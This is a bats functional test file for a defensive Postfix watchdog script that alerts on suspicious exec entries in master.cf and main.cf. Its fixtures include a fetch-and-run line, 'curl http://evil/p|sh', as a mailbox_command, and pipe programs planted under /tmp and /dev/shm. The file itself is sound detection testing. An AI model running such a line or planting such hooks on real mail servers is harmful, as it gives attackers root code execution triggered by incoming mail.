#!/usr/bin/env bats
# L2 bats functional tests for the postfix-exec-watchdog scan script.
#
# Postfix runs external programs from master.cf pipe/spawn services
# (`argv=<prog>`) and from main.cf `*_command` directives (mailbox_command,
# …) AS ROOT or a mail user, fired by mail of a matching class — a
# mail-triggered exec surface (T1546). An argv= / *_command program under a
# writable root (/tmp /var/tmp /dev/shm /home), or carrying an injection
# pattern, or a world-writable/non-root config, is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the configs
# in a tmp sandbox via SELFDEF_POSTFIX_MASTER / _MAIN.
#
# Run with: bats packaging/test/L2-postfix-exec-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd/postfix-exec-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    MASTER="${TMP}/master.cf"
    MAIN="${TMP}/main.cf"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_POSTFIX_PROFILE="${PROFILE:-report}" \
    SELFDEF_POSTFIX_BASELINE="${BASELINE}" \
    SELFDEF_POSTFIX_MASTER="${MASTER_F:-$MASTER}" \
    SELFDEF_POSTFIX_MAIN="${MAIN_F:-$MAIN}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# A benign Postfix exec posture: a maildrop pipe service + a procmail
# mailbox_command, both under /usr (trusted).
seed_benign() {
    printf 'maildrop  unix  -       n       n       -       -       pipe\n  flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}\n' > "${MASTER}"
    printf 'mailbox_command = /usr/bin/procmail -a "$EXTENSION"\n' > "${MAIN}"
}

# ============================================================
# ok tier
# ============================================================

@test "no postfix config → ok / no_postfix" {
    MASTER_F="${TMP}/nonexistent-master" MAIN_F="${TMP}/nonexistent-main" run_wd
    cap | grep -q '"event":"no_postfix"'
    cap | grep -q '"severity":"ok"'
}

@test "benign argv + mailbox_command, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / postfix_exec_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"postfix_exec_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "a master.cf argv= under a writable root → alert / postfix_exec_suspicious" {
    seed_benign
    run_wd                                   # benign baseline
    printf 'evil  unix  -       n       n       -       -       pipe\n  flags=DRhu argv=/tmp/.x\n' > "${MASTER}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"postfix_exec_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a main.cf mailbox_command under a writable root → alert" {
    seed_benign
    run_wd
    printf 'mailbox_command = /dev/shm/.deliver\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "an injection pattern in a *_command directive → alert" {
    seed_benign
    run_wd
    printf 'mailbox_command = curl http://evil/p|sh\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable config → alert" {
    seed_benign
    run_wd
    chmod 0666 "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign argv change → warn / postfix_exec_changed" {
    seed_benign
    run_wd
    printf 'maildrop  unix  -       n       n       -       -       pipe\n  flags=DRhu user=vmail argv=/usr/bin/maildrop2 -d ${recipient}\n' > "${MASTER}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"postfix_exec_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr-rooted argv + mailbox_command is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# fail-loud + enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious argv" {
    seed_benign
    run_wd
    printf 'evil  unix  -       n       n       -       -       pipe\n  flags=DRhu argv=/tmp/.x\n' > "${MASTER}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
